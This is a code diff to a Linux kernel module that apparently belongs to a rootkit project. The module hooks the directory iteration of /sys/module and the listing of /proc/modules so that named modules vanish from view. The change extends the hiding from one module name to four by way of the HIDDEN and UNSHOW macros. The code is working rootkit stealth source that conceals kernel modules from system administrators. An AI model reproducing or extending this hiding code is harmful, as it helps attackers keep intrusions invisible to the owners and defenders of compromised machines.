@@ -33,7 +33,10 @@ MODULE_LICENSE("GPL");
 
 # define ROOT_PATH "/sys/module"
 # define PROC_PATH "/proc/modules"
-# define SECRET_MODULE "kohidko"
+# define SECRET_MODULE0 "kohidko"
+# define SECRET_MODULE1 "pthidko"
+# define SECRET_MODULE2 "fshidko"
+# define SECRET_MODULE3 "pshidko"
 
 int
 (*real_iterate)(struct file *filp, struct dir_context *ctx);
@@ -97,19 +100,29 @@ fake_iterate(struct file *filp, struct dir_context *ctx)
 }
 
 
+#define HIDDEN(filename)                        \
+    if (strcmp(name, filename) == 0) {          \
+        fm_alert("Hiding module: %s", name);    \
+        return 0;                               \
+    }
+
 int
 fake_filldir(struct dir_context *ctx, const char *name, int namlen,
              loff_t offset, u64 ino, unsigned d_type)
 {
-    if (strcmp(name, SECRET_MODULE) == 0) {
-        fm_alert("Hiding module: %s", name);
-        return 0;
-    }
-
+    HIDDEN(SECRET_MODULE0)
+    HIDDEN(SECRET_MODULE1)
+    HIDDEN(SECRET_MODULE2)
+    HIDDEN(SECRET_MODULE3)
     return real_filldir(ctx, name, namlen, offset, ino, d_type);
 }
 
 
+# define UNSHOW(filename)                                                      \
+    if (strnstr(seq->buf + seq->count - last_size, filename, last_size)) {     \
+        fm_alert("Hiding module: %s\n", filename);                             \
+        seq->count -= last_size;                                               \
+    }
 int
 fake_seq_show(struct seq_file *seq, void *v)
 {
@@ -120,11 +133,10 @@ fake_seq_show(struct seq_file *seq, void *v)
     ret =  real_seq_show(seq, v);
     last_size = seq->count - last_count;
 
-    if (strnstr(seq->buf + seq->count - last_size, SECRET_MODULE,
-                last_size)) {
-        fm_alert("Hiding module: %s\n", SECRET_MODULE);
-        seq->count -= last_size;
-    }
+    UNSHOW(SECRET_MODULE0)
+    UNSHOW(SECRET_MODULE1)
+    UNSHOW(SECRET_MODULE2)
+    UNSHOW(SECRET_MODULE3)
 
     return ret;
 }
